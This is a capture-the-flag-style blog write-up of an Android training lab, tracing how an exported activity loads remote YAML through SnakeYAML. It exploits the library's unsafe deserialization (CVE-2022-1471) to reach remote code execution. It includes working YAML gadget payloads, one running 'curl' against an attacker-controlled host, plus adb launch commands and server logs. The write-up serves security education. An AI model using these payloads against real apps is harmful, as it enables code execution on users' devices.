---
layout: post
title: Config Editor - Mobile Hacking Lab
color: rgb(51,122,183)
tags: [Mobile Hacking lab, Android Security]
comments: true
share: false
excerpt_separator: <!--more-->
---

The [Config Editor](https://www.mobilehackinglab.com/course/lab-config-editor-rce) lab aims to achieve remote code execution (RCE) by exploiting a vulnerability in a third-party library. <!--more--> In this article, we'll explore which library is vulnerable and how we can exploit it to achieve RCE.

### Introduction

Upon opening the application, a permission popup for filesystem access is displayed. After granting this permission, we encounter a text editor that allows loading and saving files in `.yml` format. Let's dive into the code to understand what's happening.

### Static Analysis

Let's start by analyzing the `AndroidManifest.xml`. Upon analysis, we find that the `MainActivity` class is exported and allows the application to start with `android.intent.action.VIEW` action and with various schemes: `file`, `http`, and `http`s. It also requires the file type to be `application/yaml`.

```xml
<!--AndroidManifest.xml-->
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android" android:versionCode="1" android:versionName="1.0" android:compileSdkVersion="34" android:compileSdkVersionCodename="14" package="com.mobilehackinglab.configeditor" platformBuildVersionCode="34" platformBuildVersionName="14">
    <uses-sdk android:minSdkVersion="26" android:targetSdkVersion="33"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
    <permission android:name="com.mobilehackinglab.configeditor.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION" android:protectionLevel="signature"/>
    <uses-permission android:name="com.mobilehackinglab.configeditor.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"/>
    <application android:theme="@style/Theme.ConfigEditor" android:label="@string/app_name" android:icon="@mipmap/ic_launcher" android:debuggable="true" android:allowBackup="true" android:supportsRtl="true" android:extractNativeLibs="false" android:fullBackupContent="@xml/backup_rules" android:networkSecurityConfig="@xml/network_security_config" android:roundIcon="@mipmap/ic_launcher_round" android:appComponentFactory="androidx.core.app.CoreComponentFactory" android:dataExtractionRules="@xml/data_extraction_rules">
        <activity android:name="com.mobilehackinglab.configeditor.MainActivity" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
            <intent-filter>
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <data android:scheme="file"/>
                <data android:scheme="http"/>
                <data android:scheme="https"/>
                <data android:mimeType="application/yaml"/>
            </intent-filter>
        </activity>
        ...
</manifest>
```

Next, let's look at the `MainActivity` class. We can see that it implements the `handleIntent` function, which checks if the action is of type `android.intent.action.VIEW` and if it has a valid `URI`. If this condition is met, it calls the `CopyUtil.Companion.copyFileFromUri(data).observe` function, which loads the file and then passes it to the `loadyaml(Uri uri)` function.

```java
// MainActivity
package com.mobilehackinglab.configeditor;

...
import org.yaml.snakeyaml.DumperOptions;
import org.yaml.snakeyaml.Yaml;

/* compiled from: MainActivity.kt */
@Metadata(m27d1 = {"\u0000L\n\u0002\u0018\u0002\n\u0002\u0018\u0002\n\u0002\b\u0002\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0002\u0010\u000b\n\u0000\n\u0002\u0010\u0002\n\u0002\b\u0003\n\u0002\u0018\u0002\n\u0002\b\u0002\n\u0002\u0018\u0002\n\u0002\b\u0002\n\u0002\u0010\b\n\u0000\n\u0002\u0010\u0011\n\u0002\u0010\u000e\n\u0000\n\u0002\u0010\u0015\n\u0002\b\u0007\b\u0007\u0018\u0000 \u001e2\u00020\u0001:\u0001\u001eB\u0005¢\u0006\u0002\u0010\u0002J\b\u0010\b\u001a\u00020\tH\u0002J\b\u0010\n\u001a\u00020\u0007H\u0002J\u0010\u0010\u000b\u001a\u00020\t2\u0006\u0010\f\u001a\u00020\rH\u0002J\u0012\u0010\u000e\u001a\u00020\t2\b\u0010\u000f\u001a\u0004\u0018\u00010\u0010H\u0014J+\u0010\u0011\u001a\u00020\t2\u0006\u0010\u0012\u001a\u00020\u00132\f\u0010\u0014\u001a\b\u0012\u0004\u0012\u00020\u00160\u00152\u0006\u0010\u0017\u001a\u00020\u0018H\u0016¢\u0006\u0002\u0010\u0019J\u000e\u0010\u001a\u001a\u00020\u0007H\u0082@¢\u0006\u0002\u0010\u001bJ\u0010\u0010\u001c\u001a\u00020\t2\u0006\u0010\f\u001a\u00020\rH\u0002J\b\u0010\u001d\u001a\u00020\tH\u0002R\u000e\u0010\u0003\u001a\u00020\u0004X\u0082.¢\u0006\u0002\n\u0000R\u0016\u0010\u0005\u001a\n\u0012\u0004\u0012\u00020\u0007\u0018\u00010\u0006X\u0082\u000e¢\u0006\u0002\n\u0000¨\u0006\u001f"}, m26d2 = {"Lcom/mobilehackinglab/configeditor/MainActivity;", "Landroidx/appcompat/app/AppCompatActivity;", "()V", "binding", "Lcom/mobilehackinglab/configeditor/databinding/ActivityMainBinding;", "permissionContinuation", "Lkotlin/coroutines/Continuation;", "", "handleIntent", "", "hasExternalStoragePermission", "loadYaml", "uri", "Landroid/net/Uri;", "onCreate", "savedInstanceState", "Landroid/os/Bundle;", "onRequestPermissionsResult", "requestCode", "", "permissions", "", "", "grantResults", "", "(I[Ljava/lang/String;[I)V", "requestStoragePermissionAsync", "(Lkotlin/coroutines/Continuation;)Ljava/lang/Object;", "saveYaml", "setButtonListeners", "Companion", "app_debug"}, m25k = 1, m24mv = {1, 9, 0}, m22xi = ConstraintLayout.LayoutParams.Table.LAYOUT_CONSTRAINT_VERTICAL_CHAINSTYLE)
/* loaded from: classes4.dex */
public final class MainActivity extends AppCompatActivity {
    private static final int PERMISSION_REQUEST_EXTERNAL_STORAGE = 1;
    private ActivityMainBinding binding;
    private Continuation<? super Boolean> permissionContinuation;
    public static final Companion Companion = new Companion(null);
    private static final String TAG = Companion.class.getSimpleName();

    /* JADX INFO: Access modifiers changed from: protected */
    @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ActivityMainBinding inflate = ActivityMainBinding.inflate(getLayoutInflater());
        Intrinsics.checkNotNullExpressionValue(inflate, "inflate(...)");
        this.binding = inflate;
        ActivityMainBinding activityMainBinding = null;
        if (inflate == null) {
            Intrinsics.throwUninitializedPropertyAccessException("binding");
            inflate = null;
        }
        setContentView(inflate.getRoot());
        BuildersKt__Builders_commonKt.launch$default(GlobalScope.INSTANCE, null, null, new MainActivity$onCreate$1(this, null), 3, null);
        ActivityMainBinding activityMainBinding2 = this.binding;
        if (activityMainBinding2 == null) {
            Intrinsics.throwUninitializedPropertyAccessException("binding");
        } else {
            activityMainBinding = activityMainBinding2;
        }
        EditText $this$onCreate_u24lambda_u240 = activityMainBinding.contentArea;
        $this$onCreate_u24lambda_u240.setHorizontallyScrolling(true);
        $this$onCreate_u24lambda_u240.setMaxLines(Integer.MAX_VALUE);
        $this$onCreate_u24lambda_u240.setHorizontalScrollBarEnabled(true);
        $this$onCreate_u24lambda_u240.setScrollBarStyle(16777216);
        setButtonListeners();
        handleIntent();
    }

    /* JADX INFO: Access modifiers changed from: private */
    public final Object requestStoragePermissionAsync(Continuation<? super Boolean> continuation) {
        SafeContinuationJvm safeContinuationJvm = new SafeContinuationJvm(IntrinsicsKt.intercepted(continuation));
        SafeContinuationJvm cont = safeContinuationJvm;
        if (hasExternalStoragePermission()) {
            Result.Companion companion = Result.Companion;
            cont.resumeWith(Result.m188constructorimpl(boxing.boxBoolean(true)));
        } else {
            this.permissionContinuation = cont;
            ActivityCompat.requestPermissions(this, new String[]{"android.permission.READ_EXTERNAL_STORAGE", "android.permission.WRITE_EXTERNAL_STORAGE"}, 1);
        }
        Object orThrow = safeContinuationJvm.getOrThrow();
        if (orThrow == IntrinsicsKt.getCOROUTINE_SUSPENDED()) {
            DebugProbes.probeCoroutineSuspended(continuation);
        }
        return orThrow;
    }

    private final boolean hasExternalStoragePermission() {
        return ContextCompat.checkSelfPermission(this, "android.permission.READ_EXTERNAL_STORAGE") == 0 && ContextCompat.checkSelfPermission(this, "android.permission.WRITE_EXTERNAL_STORAGE") == 0;
    }

    @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, android.app.Activity
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        Intrinsics.checkNotNullParameter(permissions, "permissions");
        Intrinsics.checkNotNullParameter(grantResults, "grantResults");
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        boolean granted = true;
        if (requestCode == 1) {
            if (!(!(grantResults.length == 0)) || grantResults[0] != 0 || grantResults[1] != 0) {
                granted = false;
            }
            Continuation<? super Boolean> continuation = this.permissionContinuation;
            if (continuation != null) {
                Boolean valueOf = Boolean.valueOf(granted);
                Result.Companion companion = Result.Companion;
                continuation.resumeWith(Result.m188constructorimpl(valueOf));
            }
        }
    }

    private final void setButtonListeners() {
        final ActivityResultLauncher getContent = registerForActivityResult(new ActivityResultContracts.GetContent(), new ActivityResultCallback() { // from class: com.mobilehackinglab.configeditor.MainActivity$$ExternalSyntheticLambda0
            @Override // androidx.activity.result.ActivityResultCallback
            public final void onActivityResult(Object obj) {
                MainActivity.setButtonListeners$lambda$3(MainActivity.this, (Uri) obj);
            }
        });
        Intrinsics.checkNotNullExpressionValue(getContent, "registerForActivityResult(...)");
        ActivityMainBinding activityMainBinding = this.binding;
        ActivityMainBinding activityMainBinding2 = null;
        if (activityMainBinding == null) {
            Intrinsics.throwUninitializedPropertyAccessException("binding");
            activityMainBinding = null;
        }
        activityMainBinding.loadButton.setOnClickListener(new View.OnClickListener() { // from class: com.mobilehackinglab.configeditor.MainActivity$$ExternalSyntheticLambda1
            @Override // android.view.View.OnClickListener
            public final void onClick(View view) {
                MainActivity.setButtonListeners$lambda$4(ActivityResultLauncher.this, view);
            }
        });
        final ActivityResultLauncher createDocument = registerForActivityResult(new ActivityResultContracts.CreateDocument("text/yaml"), new ActivityResultCallback() { // from class: com.mobilehackinglab.configeditor.MainActivity$$ExternalSyntheticLambda2
            @Override // androidx.activity.result.ActivityResultCallback
            public final void onActivityResult(Object obj) {
                MainActivity.setButtonListeners$lambda$6(MainActivity.this, (Uri) obj);
            }
        });
        Intrinsics.checkNotNullExpressionValue(createDocument, "registerForActivityResult(...)");
        ActivityMainBinding activityMainBinding3 = this.binding;
        if (activityMainBinding3 == null) {
            Intrinsics.throwUninitializedPropertyAccessException("binding");
        } else {
            activityMainBinding2 = activityMainBinding3;
        }
        activityMainBinding2.saveButton.setOnClickListener(new View.OnClickListener() { // from class: com.mobilehackinglab.configeditor.MainActivity$$ExternalSyntheticLambda3
            @Override // android.view.View.OnClickListener
            public final void onClick(View view) {
                MainActivity.setButtonListeners$lambda$7(ActivityResultLauncher.this, view);
            }
        });
    }

    /* JADX INFO: Access modifiers changed from: private */
    public static final void setButtonListeners$lambda$3(MainActivity this$0, Uri uri) {
        Intrinsics.checkNotNullParameter(this$0, "this$0");
        if (uri != null) {
            this$0.loadYaml(uri);
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public static final void setButtonListeners$lambda$4(ActivityResultLauncher getContent, View it) {
        Intrinsics.checkNotNullParameter(getContent, "$getContent");
        getContent.launch("*/*");
    }

    /* JADX INFO: Access modifiers changed from: private */
    public static final void setButtonListeners$lambda$6(MainActivity this$0, Uri uri) {
        Intrinsics.checkNotNullParameter(this$0, "this$0");
        if (uri != null) {
            this$0.saveYaml(uri);
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public static final void setButtonListeners$lambda$7(ActivityResultLauncher createDocument, View it) {
        Intrinsics.checkNotNullParameter(createDocument, "$createDocument");
        createDocument.launch("example.yml");
    }

    private final void handleIntent() {
        Intent intent = getIntent();
        String action = intent.getAction();
        Uri data = intent.getData();
        if (Intrinsics.areEqual("android.intent.action.VIEW", action) && data != null) {
            CopyUtil.Companion.copyFileFromUri(data).observe(this, new MainActivity$sam$androidx_lifecycle_Observer$0(new Function1<Uri, Unit>() { // from class: com.mobilehackinglab.configeditor.MainActivity$handleIntent$1
                /* JADX INFO: Access modifiers changed from: package-private */
                {
                    super(1);
                }

                @Override // kotlin.jvm.functions.Function1
                public /* bridge */ /* synthetic */ Unit invoke(Uri uri) {
                    invoke2(uri);
                    return Unit.INSTANCE;
                }

                /* renamed from: invoke  reason: avoid collision after fix types in other method */
                public final void invoke2(Uri uri) {
                    MainActivity mainActivity = MainActivity.this;
                    Intrinsics.checkNotNull(uri);
                    mainActivity.loadYaml(uri);
                }
            }));
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public final void loadYaml(Uri uri) {
        try {
            ParcelFileDescriptor openFileDescriptor = getContentResolver().openFileDescriptor(uri, "r");
            ParcelFileDescriptor parcelFileDescriptor = openFileDescriptor;
            FileInputStream inputStream = new FileInputStream(parcelFileDescriptor != null ? parcelFileDescriptor.getFileDescriptor() : null);
            DumperOptions $this$loadYaml_u24lambda_u249_u24lambda_u248 = new DumperOptions();
            $this$loadYaml_u24lambda_u249_u24lambda_u248.setDefaultFlowStyle(DumperOptions.FlowStyle.BLOCK);
            $this$loadYaml_u24lambda_u249_u24lambda_u248.setIndent(2);
            $this$loadYaml_u24lambda_u249_u24lambda_u248.setPrettyFlow(true);
            Yaml yaml = new Yaml($this$loadYaml_u24lambda_u249_u24lambda_u248);
            Object deserializedData = yaml.load(inputStream);
            String serializedData = yaml.dump(deserializedData);
            ActivityMainBinding activityMainBinding = this.binding;
            if (activityMainBinding == null) {
                Intrinsics.throwUninitializedPropertyAccessException("binding");
                activityMainBinding = null;
            }
            activityMainBinding.contentArea.setText(serializedData);
            Unit unit = Unit.INSTANCE;
            Closeable.closeFinally(openFileDescriptor, null);
        } catch (Exception e) {
            Log.e(TAG, "Error loading YAML: " + uri, e);
        }
    }

    private final void saveYaml(Uri uri) {
        try {
            OutputStream openOutputStream = getContentResolver().openOutputStream(uri);
            if (openOutputStream != null) {
                OutputStream outputStream = openOutputStream;
                OutputStream outputStream2 = outputStream;
                ActivityMainBinding activityMainBinding = this.binding;
                if (activityMainBinding == null) {
                    Intrinsics.throwUninitializedPropertyAccessException("binding");
                    activityMainBinding = null;
                }
                String data = activityMainBinding.contentArea.getText().toString();
                byte[] bytes = data.getBytes(Charsets.UTF_8);
                Intrinsics.checkNotNullExpressionValue(bytes, "getBytes(...)");
                outputStream2.write(bytes);
                Unit unit = Unit.INSTANCE;
                Closeable.closeFinally(outputStream, null);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error saving YAML: " + uri, e);
        }
    }

    /* compiled from: MainActivity.kt */
    @Metadata(m27d1 = {"\u0000\u001a\n\u0002\u0018\u0002\n\u0002\u0010\u0000\n\u0002\b\u0002\n\u0002\u0010\b\n\u0000\n\u0002\u0010\u000e\n\u0002\b\u0002\b\u0086\u0003\u0018\u00002\u00020\u0001B\u0007\b\u0002¢\u0006\u0002\u0010\u0002R\u000e\u0010\u0003\u001a\u00020\u0004X\u0082T¢\u0006\u0002\n\u0000R\u0016\u0010\u0005\u001a\n \u0007*\u0004\u0018\u00010\u00060\u0006X\u0082\u0004¢\u0006\u0002\n\u0000¨\u0006\b"}, m26d2 = {"Lcom/mobilehackinglab/configeditor/MainActivity$Companion;", "", "()V", "PERMISSION_REQUEST_EXTERNAL_STORAGE", "", "TAG", "", "kotlin.jvm.PlatformType", "app_debug"}, m25k = 1, m24mv = {1, 9, 0}, m22xi = ConstraintLayout.LayoutParams.Table.LAYOUT_CONSTRAINT_VERTICAL_CHAINSTYLE)
    /* loaded from: classes4.dex */
    public static final class Companion {
        public /* synthetic */ Companion(DefaultConstructorMarker defaultConstructorMarker) {
            this();
        }

        private Companion() {
        }
    }
}
```

However, within the `loadYaml` or `saveYaml` function, nothing interesting happens. So, let's continue searching for something that might be useful.

After examining the source code further, we find the `LegacyCommandUtil` class, which in its constructor receives a command and executes it. This function allows code execution, but it's not called anywhere.

```java
// LegacyCommandUtil
package com.mobilehackinglab.configeditor;

...
import kotlin.jvm.internal.Intrinsics;

/* compiled from: LegacyCommandUtil.kt */
@Deprecated(level = DeprecationLevel.ERROR, message = "Command Util is unsafe and should not be used")
@Metadata(m27d1 = {"\u0000\u0012\n\u0002\u0018\u0002\n\u0002\u0010\u0000\n\u0000\n\u0002\u0010\u000e\n\u0002\b\u0002\b\u0007\u0018\u00002\u00020\u0001B\r\u0012\u0006\u0010\u0002\u001a\u00020\u0003¢\u0006\u0002\u0010\u0004¨\u0006\u0005"}, m26d2 = {"Lcom/mobilehackinglab/configeditor/LegacyCommandUtil;", "", "command", "", "(Ljava/lang/String;)V", "app_debug"}, m25k = 1, m24mv = {1, 9, 0}, m22xi = ConstraintLayout.LayoutParams.Table.LAYOUT_CONSTRAINT_VERTICAL_CHAINSTYLE)
/* loaded from: classes4.dex */
public final class LegacyCommandUtil {
    public LegacyCommandUtil(String command) {
        Intrinsics.checkNotNullParameter(command, "command");
        Runtime.getRuntime().exec(command);
    }
}
```

### Explointing the CVE

Upon further investigation, we discover that the package used for YAML processing, `org.yaml.snakeyaml`, is vulnerable to arbitrary code execution due to a flaw in its `Constructor` class. The vulnerability is described in [CVE-2022-1471](https://snyk.io/blog/unsafe-deserialization-snakeyaml-java-cve-2022-1471/).

After reading this article, we need to create our HTTP server to serve our malicious `.yml` file as described in the article.

Now, we serve this file on our HTTP server:
```yml
# rce.yml
rce: !!javax.script.ScriptEngineManager [
    !!java.net.URLClassLoader [[
        !!java.net.URL [http://192.168.0.101]
    ]]
]
```
And start the app with the following command:
```bash
adb shell am start -a android.intent.action.VIEW -d  "http://192.168.0.101/rce.yml" -n com.mobilehackinglab.configeditor/.MainActivity
``` 

However, looking at Logcat, we see the following error:
```
Caused by: org.yaml.snakeyaml.error.YAMLException: Class not found: javax.script.ScriptEngineManager
```

This is where everything makes sense, and the `LegacyCommandUtil` class becomes important. All we need to do is create a `.yml` file that calls this class in order to achieve code execution.

Now, we serve this file on our HTTP server:
```yml
# rce1.yml
rce: !!com.mobilehackinglab.configeditor.LegacyCommandUtil ["curl 192.168.0.101"]
```
And start the app with the following command:
```bash
adb shell am start -a android.intent.action.VIEW -d  "http://192.168.0.101/rce1.yml" -n com.mobilehackinglab.configeditor/.MainActivity
``` 

And we can see interaction on our HTTP server, confirming the RCE.

```
::ffff:192.168.0.103 - - [08/Feb/2024 21:50:26] "GET /rce1.yml HTTP/1.1" 200 -
::ffff:192.168.0.103 - - [08/Feb/2024 21:50:26] "GET / HTTP/1.1" 200 -
```

### Conclusion

This lab taught us how a library implemented in an application can lead to remote code execution, emphasizing the importance of being cautious about the code we import into our projects. For a hands-on experience with these concepts, visit the [MobileHackingLab - Config Editor](https://www.mobilehackinglab.com/course/lab-config-editor-rce). Embark on a journey of discovery and enhance your skills in mobile security.